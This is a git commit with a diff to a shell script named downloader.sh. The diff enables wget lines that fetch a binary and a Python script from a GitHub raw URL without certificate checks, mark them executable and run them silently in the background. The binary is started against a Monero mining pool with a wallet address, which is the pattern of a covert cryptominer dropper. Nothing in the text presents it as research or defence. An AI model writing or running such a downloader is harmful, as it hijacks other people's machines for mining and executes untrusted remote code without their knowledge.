a71fa9ee4128eb087003304e65216989b0abbe4b
xtremx@zinad.net <xtremx@zinad.net>
2018-03-06 10:09:48 +0200

    downloader

--- downloader.sh
+++ downloader.sh
@@ -1,11 +1,11 @@
 mkdir -p /opt/code/
 
-#wget --no-check-certificate "https://raw.githubusercontent.com/x7r3mx/arm/master/goal" -P /opt/code
+wget --no-check-certificate "https://raw.githubusercontent.com/x7r3mx/arm/master/goal" -P /opt/code
 chmod 700 /opt/code/goal
 /opt/code/goal -c x -M stratum+tcp://44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn:x@mine.moneropool.com:3333/xmr &>/dev/null &
 
 
-#wget --no-check-certificate "https://raw.githubusercontent.com/x7r3mx/arm/master/origin.py" -P /opt/code
+wget --no-check-certificate "https://raw.githubusercontent.com/x7r3mx/arm/master/origin.py" -P /opt/code
 chmod 700 /opt/code/origin.py
 python /opt/code/origin.py &>/dev/null &
 
